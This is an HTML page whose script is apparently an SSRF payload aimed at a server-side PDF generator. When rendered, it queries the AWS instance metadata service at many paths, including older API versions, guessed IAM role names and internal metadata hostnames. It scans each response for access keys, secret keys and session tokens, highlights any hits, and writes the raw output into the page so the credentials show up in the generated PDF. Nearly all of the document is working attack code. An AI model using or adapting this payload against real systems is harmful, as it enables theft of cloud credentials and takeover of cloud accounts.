<!DOCTYPE html>
<html>
<head>
    <title>PDF Generator Direct AWS Access</title>
</head>
<body>
    <h1>📄 PDF Generator Direct AWS Metadata Access</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Test if the PDF generator can directly access AWS metadata (without redirector)
        var directAWSTests = [
            // Direct AWS metadata access (PDF generator might have different permissions)
            { url: 'http://169.254.169.254/latest/meta-data/', desc: 'AWS Metadata Root' },
            { url: 'http://169.254.169.254/latest/meta-data/iam/', desc: 'IAM Root' },
            { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: 'Security Credentials List' },
            { url: 'http://169.254.169.254/latest/user-data/', desc: 'User Data' },
            
            // Try older AWS API versions (might not have token requirements)
            { url: 'http://169.254.169.254/1.0/meta-data/', desc: 'AWS v1.0 Metadata' },
            { url: 'http://169.254.169.254/1.0/meta-data/iam/security-credentials/', desc: 'AWS v1.0 IAM Credentials' },
            { url: 'http://169.254.169.254/2007-01-19/meta-data/', desc: 'AWS 2007 API' },
            { url: 'http://169.254.169.254/2008-02-01/meta-data/', desc: 'AWS 2008 API' },
            { url: 'http://169.254.169.254/2009-04-04/meta-data/', desc: 'AWS 2009 API' },
            
            // Try without version prefix
            { url: 'http://169.254.169.254/meta-data/', desc: 'Metadata without version' },
            { url: 'http://169.254.169.254/iam/security-credentials/', desc: 'IAM without version' },
            
            // Try specific AWS metadata endpoints
            { url: 'http://169.254.169.254/latest/meta-data/ami-id', desc: 'AMI ID' },
            { url: 'http://169.254.169.254/latest/meta-data/instance-id', desc: 'Instance ID' },
            { url: 'http://169.254.169.254/latest/meta-data/instance-type', desc: 'Instance Type' },
            { url: 'http://169.254.169.254/latest/meta-data/local-hostname', desc: 'Local Hostname' },
            { url: 'http://169.254.169.254/latest/meta-data/public-hostname', desc: 'Public Hostname' },
            { url: 'http://169.254.169.254/latest/meta-data/public-ipv4', desc: 'Public IP' },
            { url: 'http://169.254.169.254/latest/meta-data/placement/', desc: 'Placement Info' },
            
            // Try known role names
            { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role', desc: 'S3Role Credentials' },
            { url: 'http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role', desc: 'S3Role v1.0' },
            { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role', desc: 'EC2Role Credentials' },
            { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/DefaultRole', desc: 'DefaultRole Credentials' },
            
            // Try alternative metadata service hostnames
            { url: 'http://metadata.ec2.internal/latest/meta-data/', desc: 'Internal metadata hostname' },
            { url: 'http://instance-data.ec2.internal/latest/meta-data/', desc: 'Instance data hostname' },
        ];
        
        for(var i = 0; i < directAWSTests.length; i++) {
            try {
                var test = directAWSTests[i];
                results += "<h3>☁️ " + (i+1) + ": " + test.desc + "</h3>";
                results += "<div style='font-size:11px;color:#666;margin-bottom:5px;'>" + test.url + "</div>";
                
                var xhr = new XMLHttpRequest();
                xhr.open('GET', test.url, false);
                xhr.send();
                
                if(xhr.responseText && xhr.responseText.trim().length > 0) {
                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>✅ RESPONSE: " + xhr.responseText.length + " bytes</div>";
                    
                    // Check for AWS credentials
                    var text = xhr.responseText.toLowerCase();
                    if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
                        results += "<div style='background:#ff0000;color:white;padding:15px;border:4px solid red;font-weight:bold;text-align:center;font-size:14px;'>🚨🚨🚨 AWS CREDENTIALS FOUND! 🚨🚨🚨</div>";
                    }
                    if(text.includes('asia') && text.includes('secret')) {
                        results += "<div style='background:#ff4500;color:white;padding:12px;border:3px solid orange;'>🔑 AWS ACCESS KEY PATTERN DETECTED!</div>";
                    }
                    if(text.includes('{') && (text.includes('token') || text.includes('key'))) {
                        results += "<div style='background:#32cd32;color:white;padding:10px;'>📋 JSON CREDENTIAL RESPONSE!</div>";
                    }
                    if(text.includes('s3role') || text.includes('ec2role') || text.includes('iam')) {
                        results += "<div style='background:#ffa500;color:white;padding:8px;'>🎭 IAM ROLE DETECTED!</div>";
                    }
                    if(text.includes('ami-') || text.includes('i-') || text.includes('vol-') || text.includes('subnet-')) {
                        results += "<div style='background:#74c0fc;padding:8px;'>☁️ AWS RESOURCE IDENTIFIERS!</div>";
                    }
                    if(text.includes('401') || text.includes('unauthorized')) {
                        results += "<div style='background:#ffeaa7;padding:8px;'>⚠️ 401 Unauthorized (needs token)</div>";
                    }
                    if(text.includes('403') || text.includes('forbidden')) {
                        results += "<div style='background:#ffcccb;padding:8px;'>🚫 403 Forbidden</div>";
                    }
                    if(!text.includes('401') && !text.includes('403') && !text.includes('unauthorized') && !text.includes('forbidden')) {
                        results += "<div style='background:#90ee90;padding:8px;'>✅ Successful Access (No Auth Error!)</div>";
                    }
                    
                    results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
                } else {
                    results += "<div style='background:#ffe8e8;padding:3px;'>❌ No response</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:3px;'>❌ " + e.message.substring(0, 60) + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
